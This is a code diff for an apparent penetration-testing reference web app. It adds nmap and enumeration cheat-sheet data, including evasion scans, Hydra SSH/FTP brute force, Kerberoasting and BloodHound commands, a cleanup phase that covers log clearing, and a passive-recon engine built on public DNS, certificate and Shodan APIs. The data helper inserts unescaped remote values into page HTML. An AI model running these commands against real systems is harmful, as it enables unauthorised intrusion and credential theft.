+    steps: ['Remove web shells and backdoors', 'Clear relevant log entries (document for report)', 'Restore modified configurations', 'Remove persistence mechanisms', 'Document all changes for client report'],
+    opsec: 'Do NOT delete all logs — this is itself detectable and may violate scope. Restore to original state.',
+    detect: 'Mass log deletion is a huge red flag. Selective and documented cleanup is preferred.',
+    logging: 'Provide full cleanup report to client. Document every artifact created and removed.'
+  }
+];
+
+const NMAP_COMMANDS = [
+  {
+    label: 'Basic Discovery',
+    commands: [
+      { name: 'Default Scan', cmd: 'nmap target.com' },
+      { name: 'Ping Sweep (no port scan)', cmd: 'nmap -sn 192.168.1.0/24' },
+      { name: 'Skip Host Discovery', cmd: 'nmap -Pn target.com' },
+      { name: 'SYN Scan (stealth)', cmd: 'nmap -sS target.com' },
+      { name: 'TCP Connect Scan', cmd: 'nmap -sT target.com' },
+    ]
+  },
+  {
+    label: 'Service & Version Detection',
+    commands: [
+      { name: 'Version Detection', cmd: 'nmap -sV target.com' },
+      { name: 'Aggressive Scan', cmd: 'nmap -A target.com' },
+      { name: 'OS Detection', cmd: 'nmap -O target.com' },
+      { name: 'Full Aggressive + Timing', cmd: 'nmap -A -T4 target.com' },
+    ]
+  },
+  {
+    label: 'Port Range Scans',
+    commands: [
+      { name: 'All Ports', cmd: 'nmap -p- target.com' },
+      { name: 'Common Ports', cmd: 'nmap -p 22,80,443,3306,8080,8443 target.com' },
+      { name: 'Top 1000 Ports', cmd: 'nmap --top-ports 1000 target.com' },
+      { name: 'UDP Scan', cmd: 'nmap -sU -p 53,161,500,4500 target.com' },
+    ]
+  },
+  {
+    label: 'Vulnerability Scripts',
+    commands: [
+      { name: 'All Vuln Scripts', cmd: 'nmap --script vuln target.com' },
+      { name: 'HTTP Enumeration', cmd: 'nmap --script http-enum target.com' },
+      { name: 'SMB Shares Enum', cmd: 'nmap --script smb-enum-shares target.com' },
+      { name: 'SSL Cipher Check', cmd: 'nmap --script ssl-enum-ciphers -p 443 target.com' },
+      { name: 'Heartbleed Check', cmd: 'nmap --script ssl-heartbleed -p 443 target.com' },
+      { name: 'Default Creds', cmd: 'nmap --script http-default-accounts target.com' },
+    ]
+  },
+  {
+    label: 'Evasion & OPSEC',
+    commands: [
+      { name: 'Decoy Scan', cmd: 'nmap -D RND:10 target.com' },
+      { name: 'Fragment Packets', cmd: 'nmap -f target.com' },
+      { name: 'Slow/Paranoid Timing', cmd: 'nmap -T1 target.com' },
+      { name: 'Randomize Host Order', cmd: 'nmap -r target.com' },
+      { name: 'Custom Source Port', cmd: 'nmap --source-port 53 target.com' },
+    ]
+  },
+  {
+    label: 'Output Formats',
+    commands: [
+      { name: 'Normal Text Output', cmd: 'nmap -oN output.txt target.com' },
+      { name: 'XML Output', cmd: 'nmap -oX output.xml target.com' },
+      { name: 'Grepable Output', cmd: 'nmap -oG output.gnmap target.com' },
+      { name: 'All Formats', cmd: 'nmap -oA output target.com' },
+    ]
+  }
+];
+
+const ENUM_COMMANDS = [
+  {
+    label: 'SMB Enumeration',
+    commands: [
+      { name: 'enum4linux Full Scan', cmd: 'enum4linux -a target.com' },
+      { name: 'List Shares', cmd: 'smbclient -L //target.com -N' },
+      { name: 'SMB Map', cmd: 'smbmap -H target.com' },
+      { name: 'CrackMapExec SMB', cmd: 'crackmapexec smb target.com -u "" -p ""' },
+    ]
+  },
+  {
+    label: 'DNS Enumeration',
+    commands: [
+      { name: 'Zone Transfer', cmd: 'dig axfr @ns1.target.com target.com' },
+      { name: 'All DNS Records', cmd: 'dig any target.com' },
+      { name: 'Subdomain Brute', cmd: 'dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt' },
+      { name: 'DNSEnum', cmd: 'dnsenum target.com' },
+    ]
+  },
+  {
+    label: 'Web Enumeration',
+    commands: [
+      { name: 'GoBuster Directories', cmd: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt' },
+      { name: 'ffuf Fuzzing', cmd: 'ffuf -w wordlist.txt -u http://target.com/FUZZ' },
+      { name: 'Nikto Web Scan', cmd: 'nikto -h http://target.com' },
+      { name: 'WhatWeb Detect', cmd: 'whatweb target.com' },
+    ]
+  },
+  {
+    label: 'SNMP Enumeration',
+    commands: [
+      { name: 'SNMPWalk (public)', cmd: 'snmpwalk -v2c -c public target.com' },
+      { name: 'SNMP Community Brute', cmd: 'onesixtyone -c /usr/share/doc/onesixtyone/dict.txt target.com' },
+      { name: 'SNMP Check', cmd: 'snmp-check target.com' },
+    ]
+  },
+  {
+    label: 'FTP / SSH Enumeration',
+    commands: [
+      { name: 'FTP Anonymous Login', cmd: 'ftp target.com' },
+      { name: 'FTP Brute (Hydra)', cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target.com' },
+      { name: 'SSH Version Banner', cmd: 'nc -nv target.com 22' },
+      { name: 'SSH Brute (Hydra)', cmd: 'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com' },
+    ]
+  },
+  {
+    label: 'LDAP / Active Directory',
+    commands: [
+      { name: 'LDAP Enum (anonymous)', cmd: 'ldapsearch -x -h target.com -b "dc=target,dc=com"' },
+      { name: 'BloodHound Collection', cmd: 'bloodhound-python -d target.com -u user -p pass -ns 10.0.0.1 -c All' },
+      { name: 'Kerbrute User Enum', cmd: 'kerbrute userenum -d target.com users.txt' },
+      { name: 'Kerberoasting', cmd: 'GetUserSPNs.py target.com/user:password -outputfile hashes.kerberoast' },
+    ]
+  }
+];
+
+const CHECKLIST_ITEMS = [
+  { id: 'c1', phase: 'Recon', text: 'Passive OSINT complete (Shodan, Censys, LinkedIn)', tag: 'recon', color: 'badge-yellow' },
+  { id: 'c2', phase: 'Recon', text: 'Subdomain enumeration performed', tag: 'recon', color: 'badge-yellow' },
+  { id: 'c3', phase: 'Recon', text: 'Email addresses harvested', tag: 'recon', color: 'badge-yellow' },
+  { id: 'c4', phase: 'Scanning', text: 'Full port scan completed on all in-scope IPs', tag: 'scan', color: 'badge-green' },
+  { id: 'c5', phase: 'Scanning', text: 'Service/version detection run (-sV)', tag: 'scan', color: 'badge-green' },
+  { id: 'c6', phase: 'Scanning', text: 'OS fingerprinting performed', tag: 'scan', color: 'badge-green' },
+  { id: 'c7', phase: 'Enum', text: 'SMB enumeration complete', tag: 'enum', color: 'badge-green' },
+  { id: 'c8', phase: 'Enum', text: 'Web directory fuzzing performed', tag: 'enum', color: 'badge-green' },
+  { id: 'c9', phase: 'Enum', text: 'DNS zone transfer attempted', tag: 'enum', color: 'badge-green' },
+  { id: 'c10', phase: 'Enum', text: 'Default credentials checked on all services', tag: 'enum', color: 'badge-green' },
+  { id: 'c11', phase: 'Exploit', text: 'All identified CVEs tested', tag: 'exploit', color: 'badge-red' },
+  { id: 'c12', phase: 'Exploit', text: 'Web app OWASP Top 10 checked', tag: 'exploit', color: 'badge-red' },
+  { id: 'c13', phase: 'Exploit', text: 'Client-side attack vectors assessed', tag: 'exploit', color: 'badge-red' },
+  { id: 'c14', phase: 'PrivEsc', text: 'Local privilege escalation vectors checked', tag: 'privesc', color: 'badge-red' },
+  { id: 'c15', phase: 'PrivEsc', text: 'Token impersonation / Potato attacks tested', tag: 'privesc', color: 'badge-red' },
+  { id: 'c16', phase: 'Pivot', text: 'Lateral movement paths identified', tag: 'lateral', color: 'badge-yellow' },
+  { id: 'c17', phase: 'Persist', text: 'Persistence mechanisms tested and documented', tag: 'persist', color: 'badge-yellow' },
+  { id: 'c18', phase: 'Report', text: 'All findings documented with PoC evidence', tag: 'report', color: 'badge-green' },
+  { id: 'c19', phase: 'Report', text: 'Cleanup performed and verified', tag: 'report', color: 'badge-green' },
+  { id: 'c20', phase: 'Report', text: 'Final report delivered to client', tag: 'report', color: 'badge-green' },
+];
+
+// ══════════════════════════════════════════════
+// MATRIX CANVAS
+// ══════════════════════════════════════════════
+function initMatrix() {
+  const canvas = document.getElementById('matrix-canvas');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  const cols = Math.floor(canvas.width / 16);
+  const drops = Array(cols).fill(1);
+  const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ';
+
+  function draw() {
+    ctx.fillStyle = 'rgba(6,10,16,0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--neon').trim() || '#00ff9f';
+    ctx.font = '12px Share Tech Mono';
+    drops.forEach((d, i) => {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * 16, d * 16);
+      if (d * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    });
+  }
+  setInterval(draw, 60);
+  window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+}
+
+// ══════════════════════════════════════════════
+// SCROLL PROGRESS
+// ══════════════════════════════════════════════
+window.addEventListener('scroll', () => {
+  const el = document.getElementById('scroll-progress');
+  const h = document.documentElement.scrollHeight - window.innerHeight;
+  el.style.width = (window.scrollY / h * 100) + '%';
+});
+
+// ══════════════════════════════════════════════
+// SIDEBAR
+// ══════════════════════════════════════════════
+function toggleSidebar() {
+  const sb = document.getElementById('sidebar');
+  const mn = document.getElementById('main');
+  if (window.innerWidth > 768) {
+    sb.classList.toggle('collapsed');
+    mn.classList.toggle('expanded');
+  } else {
+    sb.classList.toggle('open');
+  }
+}
+
+function scrollTo_(id) {
+  document.querySelector(id)?.scrollIntoView({ behavior: 'smooth' });
+}
+
+// ══════════════════════════════════════════════
+// THEME
+// ══════════════════════════════════════════════
+function setTheme(theme, el) {
+  document.documentElement.setAttribute('data-theme', theme);
+  localStorage.setItem('rt-theme', theme);
+  document.querySelectorAll('.theme-btn').forEach(b => b.classList.remove('active'));
+  if (el) el.classList.add('active');
+}
+
+// ══════════════════════════════════════════════
+// TABS
+// ══════════════════════════════════════════════
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach((t, i) => t.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.getElementById('tab-' + name)?.classList.add('active');
+  // Activate the clicked tab button
+  const tabs = document.querySelectorAll('.tab');
+  const tabMap = ['domain','ssl','ports','whois','headers','http','tech'];
+  const idx = tabMap.indexOf(name);
+  if (idx >= 0) tabs[idx]?.classList.add('active');
+}
+
+// ══════════════════════════════════════════════
+// ANALYSIS ENGINE (Real API calls)
+// ══════════════════════════════════════════════
+let gatheredIntel = {};
+
+function parseTarget(rawTarget) {
+  const input = rawTarget.trim();
+  if (!input) return null;
+  const normalized = input.match(/^https?:\/\//i) ? input : `https://${input}`;
+  try {
+    const url = new URL(normalized);
+    return {
+      raw: input,
+      host: url.hostname,
+      protocol: url.protocol.replace(':', ''),
+      pathname: url.pathname,
+      isIP: /^(25[0-5]|2[0-4]\d|1?\d?\d)(\.(25[0-5]|2[0-4]\d|1?\d?\d)){3}$/.test(url.hostname)
+    };
+  } catch {
+    return null;
+  }
+}
+
+async function runAnalysis() {
+  const target = document.getElementById('target-input').value.trim();
+  const parsed = parseTarget(target);
+  const status = document.getElementById('analysis-status');
+  if (!parsed) {
+    status.textContent = 'Please enter a valid domain, URL, or IPv4 address.';
+    return;
+  }
+  status.textContent = `Running passive analysis for ${parsed.host}...`;
+  const spinner = document.getElementById('scan-spinner');
+  spinner.style.display = 'block';
+
+  try {
+    const intel = await fetchPassiveIntel(parsed);
+    spinner.style.display = 'none';
+    populateResults(parsed, intel);
+    status.textContent = `Analysis complete for ${parsed.host}.`;
+  } catch (err) {
+    spinner.style.display = 'none';
+    status.textContent = `Analysis failed for ${parsed.host}: ${err.message || 'Unknown error'}`;
+  }
+}
+
+async function fetchPassiveIntel(parsed) {
+  const result = { dns: {}, rdap: null, headers: null, probe: null, ssl: null, geo: null, pageContent: null };
+
+  // DNS multi-record lookup
+  const dnsTypes = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME'];
+  const dnsPromises = dnsTypes.map(async (type) => {
+    try {
+      const resp = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(parsed.host)}&type=${type}`);
+      if (resp.ok) {
+        const data = await resp.json();
+        result.dns[type] = data.Answer || [];
+      }
+    } catch { result.dns[type] = []; }
+  });
+  await Promise.all(dnsPromises);
+
+  // RDAP
+  if (!parsed.isIP) {
+    try {
+      const rdapResp = await fetch(`https://rdap.org/domain/${encodeURIComponent(parsed.host)}`);
+      if (rdapResp.ok) result.rdap = await rdapResp.json();
+    } catch {}
+  }
+
+  // HTTP probe
+  try {
+    const probe = await fetch(`https://${parsed.host}`, { method: 'HEAD', mode: 'cors' });
+    if (probe) {
+      result.headers = Object.fromEntries([...probe.headers.entries()]);
+      result.probe = { status: probe.status, statusText: probe.statusText, ok: probe.ok };
+    }
+  } catch {
+    try {
+      const probe = await fetch(`http://${parsed.host}`, { method: 'HEAD', mode: 'cors' });
+      if (probe) {
+        result.headers = Object.fromEntries([...probe.headers.entries()]);
+        result.probe = { status: probe.status, statusText: probe.statusText, ok: probe.ok };
+      }
+    } catch {}
+  }
+
+  // SSL/TLS via crt.sh
+  try {
+    const sslResp = await fetch(`https://crt.sh/?q=${encodeURIComponent(parsed.host)}&output=json`);
+    if (sslResp.ok) {
+      const sslData = await sslResp.json();
+      result.ssl = sslData.slice(0, 5);
+    }
+  } catch {}
+
+  // IP Geolocation
+  const resolvedIP = result.dns['A']?.[0]?.data;
+  if (resolvedIP && /^(\d{1,3}\.){3}\d{1,3}$/.test(resolvedIP)) {
+    try {
+      const geoResp = await fetch(`https://ipapi.co/${resolvedIP}/json/`);
+      if (geoResp.ok) result.geo = await geoResp.json();
+    } catch {}
+  }
+
+  // Try to fetch page content for tech detection
+  try {
+    const pageResp = await fetch(`https://${parsed.host}`, { mode: 'cors' });
+    if (pageResp.ok) result.pageContent = await pageResp.text();
+  } catch {}
+
+  gatheredIntel = { parsed, result, timestamp: new Date().toISOString() };
+  return result;
+}
+
+function populateResults(parsed, intel = {}) {
+  const { isIP } = parsed;
+  const clean = parsed.host;
+  const parts = clean.split('.');
+  const tld = parts.length > 1 ? '.' + parts.slice(-1)[0] : '';
+  const domain = parts.slice(-2).join('.');
+  const subdomain = parts.length > 2 ? parts.slice(0, -2).join('.') : 'None';
+
+  const aRecords = (intel.dns?.['A'] || []).map(r => r.data).join(', ') || 'N/A';
+  const aaaaRecords = (intel.dns?.['AAAA'] || []).map(r => r.data).join(', ') || 'N/A';
+  const mxRecords = (intel.dns?.['MX'] || []).map(r => r.data).join(', ') || 'N/A';
+  const nsRecords = (intel.dns?.['NS'] || []).map(r => r.data).join(', ') || 'N/A';
+  const txtRecords = (intel.dns?.['TXT'] || []).map(r => r.data).join('; ') || 'N/A';
+  const cnameRecords = (intel.dns?.['CNAME'] || []).map(r => r.data).join(', ') || 'N/A';
+
+  // Geo info
+  const geo = intel.geo;
+  const geoCards = geo ? [
+    { label: 'IP Location', value: `${geo.city || 'N/A'}, ${geo.region || ''} ${geo.country_name || ''}` },
+    { label: 'ISP / Org', value: geo.org || 'N/A' },
+    { label: 'ASN', value: geo.asn || 'N/A' },
+    { label: 'Timezone', value: geo.timezone || 'N/A' },
+  ] : [];
+
+  // Domain Info
+  document.getElementById('domain-results').innerHTML = makeCards([
+    { label: 'Target', value: clean },
+    { label: 'Type', value: isIP ? 'IP Address' : 'Domain Name' },
+    { label: 'TLD', value: tld || 'N/A' },
+    { label: 'Root Domain', value: domain },
+    { label: 'Subdomain', value: subdomain },
+    { label: 'Protocol', value: parsed.protocol.toUpperCase() || 'HTTPS' },
+    { label: 'A Records', value: aRecords },
+    { label: 'AAAA Records', value: aaaaRecords },
+    { label: 'MX Records', value: mxRecords },
+    { label: 'NS Records', value: nsRecords },
+    { label: 'CNAME', value: cnameRecords },
+    { label: 'TXT Records', value: txtRecords.length > 200 ? txtRecords.substring(0, 200) + '...' : txtRecords },
+    ...geoCards
+  ]);
+
+  // SSL/TLS
+  if (intel.ssl && intel.ssl.length > 0) {
+    const cert = intel.ssl[0];
+    const sans = [...new Set(intel.ssl.slice(0,3).map(c => c.common_name))].join(', ');
+    document.getElementById('ssl-results').innerHTML = makeCards([
+      { label: 'HTTPS Probe', value: intel.probe ? '<span class="badge badge-green">Connected</span>' : '<span class="badge badge-yellow">Could not verify</span>' },
+      { label: 'Certificate Issuer', value: cert.issuer_name || 'N/A' },
+      { label: 'Common Name', value: cert.common_name || 'N/A' },
+      { label: 'Not Before', value: cert.not_before || 'N/A' },
+      { label: 'Not After', value: cert.not_after || 'N/A' },
+      { label: 'Serial Number', value: cert.serial_number || 'N/A' },
+      { label: 'SANs (from CT)', value: sans || 'N/A' },
+      { label: 'Source', value: 'Certificate Transparency (crt.sh)' },
+    ]);
+  } else {
+    document.getElementById('ssl-results').innerHTML = makeCards([
+      { label: 'HTTPS Probe', value: intel.probe ? '<span class="badge badge-green">Connected</span>' : '<span class="badge badge-red">Failed</span>' },
+      { label: 'Certificate Data', value: 'Unable to fetch from crt.sh' },
+    ]);
+  }
+
+  // WHOIS/RDAP
+  const rdap = intel.rdap;
+  if (rdap) {
+    const registrar = rdap.entities?.find(e => e.roles?.includes('registrar'))?.vcardArray?.[1]?.find(v => v[0] === 'fn')?.[3]
+      || rdap.entities?.find(e => e.roles?.includes('registrar'))?.handle || 'N/A';
+    const registrant = rdap.entities?.find(e => e.roles?.includes('registrant'))?.vcardArray?.[1]?.find(v => v[0] === 'fn')?.[3] || 'N/A';
+    const events = rdap.events || [];
+    const regDate = events.find(e => e.eventAction === 'registration')?.eventDate || 'N/A';
+    const expDate = events.find(e => e.eventAction === 'expiration')?.eventDate || 'N/A';
+    const updDate = events.find(e => e.eventAction === 'last changed')?.eventDate || 'N/A';
+    const status = (rdap.status || []).join(', ') || 'N/A';
+    const ns = rdap.nameservers?.map(n => n.ldhName)?.join(', ') || 'N/A';
+
+    document.getElementById('whois-results').innerHTML = makeCards([
+      { label: 'Domain', value: isIP ? 'N/A' : domain },
+      { label: 'Registrar', value: registrar },
+      { label: 'Organization', value: registrant },
+      { label: 'Registered', value: regDate !== 'N/A' ? regDate.split('T')[0] : 'N/A' },
+      { label: 'Expires', value: expDate !== 'N/A' ? expDate.split('T')[0] : 'N/A' },
+      { label: 'Updated', value: updDate !== 'N/A' ? updDate.split('T')[0] : 'N/A' },
+      { label: 'Status', value: status },
+      { label: 'Nameservers', value: ns },
+    ]);
+  } else {
+    document.getElementById('whois-results').innerHTML = makeCards([
+      { label: 'Domain', value: isIP ? 'N/A (IP address)' : domain },
+      { label: 'RDAP Data', value: 'Unable to fetch RDAP data' },
+    ]);
+  }
+
+  // Security Headers - check real headers
+  const realHeaders = intel.headers || {};
+  const secHeaders = [
+    { name: 'Content-Security-Policy', key: 'content-security-policy' },
+    { name: 'X-Frame-Options', key: 'x-frame-options' },
+    { name: 'X-XSS-Protection', key: 'x-xss-protection' },
+    { name: 'X-Content-Type-Options', key: 'x-content-type-options' },
+    { name: 'Strict-Transport-Security', key: 'strict-transport-security' },
+    { name: 'Referrer-Policy', key: 'referrer-policy' },
+    { name: 'Permissions-Policy', key: 'permissions-policy' },
+    { name: 'Cross-Origin-Opener-Policy', key: 'cross-origin-opener-policy' },
+  ];
+  if (Object.keys(realHeaders).length > 0) {
+    document.getElementById('headers-results').innerHTML = secHeaders.map(h => {
+      const val = realHeaders[h.key];
+      const present = !!val;
+      return `<div class="header-check">
+        <div class="check-dot ${present ? 'present' : 'missing'}"></div>
+        <div style="flex:1;font-family:'Share Tech Mono',monospace;font-size:12px">${h.name}</div>
+        <span class="badge ${present ? 'badge-green' : 'badge-red'}">${present ? 'PRESENT' : 'MISSING'}</span>
+        ${present ? '<div style="font-size:10px;color:var(--text-dim);font-family:Share Tech Mono,monospace;margin-left:8px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + escapeHtml(val).replace(/"/g,'&quot;') + '">' + escapeHtml(val.substring(0,60)) + '</div>' : ''}
+      </div>`;
+    }).join('') + '<div style="padding:8px 14px;font-size:11px;color:var(--text-dim);font-family:Share Tech Mono,monospace">Note: Headers reflect what was accessible via browser CORS fetch. Some headers may be filtered by the browser.</div>';
+  } else {
+    document.getElementById('headers-results').innerHTML = '<div style="color:var(--text-dim);padding:20px;text-align:center;font-family:Share Tech Mono,monospace;font-size:12px">Could not retrieve headers (CORS restriction). Try a public-facing domain.</div>';
+  }
+
+  // HTTP Info - real data
+  const probe = intel.probe;
+  document.getElementById('http-results').innerHTML = makeCards([
+    { label: 'Status Code', value: probe ? `${probe.status} ${probe.statusText}` : 'Unable to probe' },
+    { label: 'Server', value: realHeaders['server'] || 'Not disclosed' },
+    { label: 'Content-Type', value: realHeaders['content-type'] || 'N/A' },
+    { label: 'X-Powered-By', value: realHeaders['x-powered-by'] || 'Not disclosed' },
+    { label: 'Cache-Control', value: realHeaders['cache-control'] || 'N/A' },
+    { label: 'CORS (Access-Control)', value: realHeaders['access-control-allow-origin'] || 'Not set' },
+    { label: 'Content-Encoding', value: realHeaders['content-encoding'] || 'N/A' },
+    { label: 'Via / Proxy', value: realHeaders['via'] || 'N/A' },
+  ]);
+
+  // Tech Stack - detect from page content
+  const pageContent = intel.pageContent || '';
+  const detections = [];
+  const techChecks = [
+    { name: 'WordPress', patterns: [/wp-content/i, /wp-includes/i, /wordpress/i] },
+    { name: 'React', patterns: [/react\.production/i, /react-dom/i, /__NEXT_DATA__/i, /reactroot/i] },
+    { name: 'Next.js', patterns: [/__NEXT_DATA__/i, /_next\/static/i] },
+    { name: 'Vue.js', patterns: [/vue\.js/i, /vue\.min\.js/i, /vue@/i, /vue-router/i] },
+    { name: 'Nuxt.js', patterns: [/__NUXT__/i, /_nuxt\//i] },
+    { name: 'Angular', patterns: [/ng-version/i, /angular\.js/i, /angular\.min\.js/i] },
+    { name: 'jQuery', patterns: [/jquery/i, /jquery\.min\.js/i] },
+    { name: 'Bootstrap', patterns: [/bootstrap\.min\.(css|js)/i, /bootstrap@/i] },
+    { name: 'Tailwind CSS', patterns: [/tailwindcss/i, /tailwind\.min/i] },
+    { name: 'Google Analytics', patterns: [/google-analytics\.com/i, /gtag\/js/i, /googletagmanager/i] },
+    { name: 'Cloudflare', patterns: [/cloudflare/i, /cf-ray/i] },
+    { name: 'Shopify', patterns: [/shopify/i, /cdn\.shopify/i] },
+    { name: 'Drupal', patterns: [/drupal/i, /sites\/default\/files/i] },
+    { name: 'Joomla', patterns: [/joomla/i, /\/media\/system\/js/i] },
+    { name: 'Wix', patterns: [/wix\.com/i, /wixstatic/i] },
+    { name: 'Squarespace', patterns: [/squarespace/i] },
+    { name: 'PHP', patterns: [/\.php/i] },
+    { name: 'ASP.NET', patterns: [/__VIEWSTATE/i, /asp\.net/i] },
+  ];
+
+  const metaGen = pageContent.match(/<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']/i);
+  if (metaGen) detections.push({ name: 'Generator', value: metaGen[1] });
+
+  techChecks.forEach(tc => {
+    if (tc.patterns.some(p => p.test(pageContent))) {
+      detections.push({ name: tc.name, value: 'Detected' });
+    }
+  });
+
+  // Also check server header for CDN clues
+  const serverHeader = realHeaders['server'] || '';
+  if (/cloudflare/i.test(serverHeader)) detections.push({ name: 'Cloudflare CDN', value: 'via Server header' });
+  if (/nginx/i.test(serverHeader)) detections.push({ name: 'Nginx', value: serverHeader });
+  if (/apache/i.test(serverHeader)) detections.push({ name: 'Apache', value: serverHeader });
+  if (/microsoft-iis/i.test(serverHeader)) detections.push({ name: 'IIS', value: serverHeader });
+  if (/litespeed/i.test(serverHeader)) detections.push({ name: 'LiteSpeed', value: serverHeader });
+
+  if (detections.length > 0) {
+    const unique = [...new Map(detections.map(d => [d.name, d])).values()];
+    document.getElementById('tech-results').innerHTML = makeCards(
+      unique.map(d => ({ label: d.name, value: d.value }))
+    ) + '<div style="padding:8px;font-size:11px;color:var(--text-dim);font-family:Share Tech Mono,monospace">Detection based on page content analysis and HTTP headers. Some technologies may not be detectable via browser.</div>';
+  } else {
+    document.getElementById('tech-results').innerHTML = makeCards([
+      { label: 'Detection', value: pageContent ? 'No common technologies detected in page source' : 'Unable to fetch page content (CORS)' },
+      { label: 'Server', value: serverHeader || 'Not disclosed' },
+    ]);
+  }
+}
+
+function makeCards(arr) {
+  return arr.map(c => `<div class="info-card"><div class="info-label">${c.label}</div><div class="info-value">${c.value}</div></div>`).join('');
+}
+
+function pad(n) { return String(n).padStart(2,'0'); }
+
+// ══════════════════════════════════════════════
+// PORT SCANNER (Shodan InternetDB)
+// ══════════════════════════════════════════════
+const COMMON_PORTS = [
+  {port:21,svc:'FTP'},{port:22,svc:'SSH'},{port:23,svc:'Telnet'},
+  {port:25,svc:'SMTP'},{port:53,svc:'DNS'},{port:80,svc:'HTTP'},
+  {port:110,svc:'POP3'},{port:135,svc:'MSRPC'},{port:139,svc:'NetBIOS'},
+  {port:143,svc:'IMAP'},{port:443,svc:'HTTPS'},{port:445,svc:'SMB'},
+  {port:1433,svc:'MSSQL'},{port:3306,svc:'MySQL'},{port:3389,svc:'RDP'},
+  {port:5432,svc:'PostgreSQL'},{port:5900,svc:'VNC'},{port:6379,svc:'Redis'},
+  {port:8080,svc:'HTTP-Proxy'},{port:8443,svc:'HTTPS-Alt'},{port:27017,svc:'MongoDB'}
+];
+
+function getServiceName(port) {
+  const known = COMMON_PORTS.find(p => p.port === port);
+  return known ? known.svc : 'unknown';
+}
+
+async function runPortScan() {
+  const target = parseTarget(document.getElementById('target-input').value.trim() || 'target.com');
+  if (!target) {
+    document.getElementById('analysis-status').textContent = 'Please provide a valid target before running a port scan.';
+    return;
+  }
+  const tbody = document.getElementById('port-tbody');
+  tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--neon);font-family:'Share Tech Mono',monospace;font-size:12px;padding:20px">Querying Shodan InternetDB for ${target.host}...</td></tr>`;
+
+  let ip = target.host;
+  if (!target.isIP) {
+    try {
+      const dnsResp = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(target.host)}&type=A`);
+      if (dnsResp.ok) {
+        const dnsData = await dnsResp.json();
+        if (dnsData.Answer && dnsData.Answer.length > 0) {
+          ip = dnsData.Answer[0].data;
+        } else {
+          tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--red);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">Could not resolve ${target.host} to an IP address.</td></tr>`;
+          return;
+        }
+      }
+    } catch {
+      tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--red);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">DNS resolution failed for ${target.host}.</td></tr>`;
+      return;
+    }
+  }
+
+  try {
+    const resp = await fetch(`https://internetdb.shodan.io/${ip}`);
+    if (!resp.ok) {
+      tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--text-dim);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">No data available from Shodan InternetDB for ${ip}. The host may not be indexed.</td></tr>`;
+      return;
+    }
+    const data = await resp.json();
+    const ports = data.ports || [];
+    const hostnames = data.hostnames || [];
+    const vulns = data.vulns || [];
+    const cpes = data.cpes || [];
+    const tags = data.tags || [];
+
+    if (ports.length === 0) {
+      tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--text-dim);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">No open ports found for ${ip} in Shodan InternetDB.</td></tr>`;
+      return;
+    }
+
+    let html = ports.map(p => {
+      const svc = getServiceName(p);
+      const cpe = cpes.find(c => c.includes(svc.toLowerCase())) || '';
+      return `<tr>
+        <td style="color:var(--neon2)">${p}/tcp</td>
+        <td>${svc}</td>
+        <td><span class="badge badge-green">OPEN</span></td>
+        <td style="color:var(--text-dim)">${cpe || '-'}</td>
+      </tr>`;
+    }).join('');
+
+    html += `<tr><td colspan="4" style="padding:10px 12px;font-size:11px;font-family:'Share Tech Mono',monospace">
+      <div style="color:var(--neon2);margin-bottom:4px">IP: ${ip} | Ports: ${ports.length} open</div>
+      ${hostnames.length ? '<div style="color:var(--text-dim)">Hostnames: ' + escapeHtml(hostnames.join(', ')) + '</div>' : ''}
+      ${vulns.length ? '<div style="color:var(--red);margin-top:4px">Known CVEs: ' + escapeHtml(vulns.join(', ')) + '</div>' : ''}
+      ${tags.length ? '<div style="color:var(--text-dim);margin-top:4px">Tags: ' + escapeHtml(tags.join(', ')) + '</div>' : ''}
+      <div style="color:var(--text-dim);margin-top:6px">⚠ Passive reconnaissance data from Shodan InternetDB (no active scanning performed)</div>
+    </td></tr>`;
+
+    tbody.innerHTML = html;
+  } catch (err) {
+    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--red);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">Error querying Shodan InternetDB: ${escapeHtml(String(err.message || err))}</td></tr>`;
+  }
+}
+
+// ══════════════════════════════════════════════
+// SUBDOMAIN DISCOVERY
+// ══════════════════════════════════════════════
+async function runSubdomainScan() {
+  const domain = document.getElementById('subdomain-input').value.trim();
+  if (!domain) {
+    document.getElementById('subdomain-status').textContent = 'Please enter a domain.';
+    return;
+  }
+  const spinner = document.getElementById('subdomain-spinner');
+  const tbody = document.getElementById('subdomain-tbody');
+  const status = document.getElementById('subdomain-status');
+  spinner.style.display = 'block';
+  status.textContent = `Searching certificate transparency logs for ${domain}...`;
+  tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:var(--neon);padding:20px">Searching...</td></tr>';
+
+  try {
+    const resp = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`);
+    if (!resp.ok) throw new Error('crt.sh returned an error');
+    const data = await resp.json();
+
+    const subdomains = new Map();
+    data.forEach(entry => {
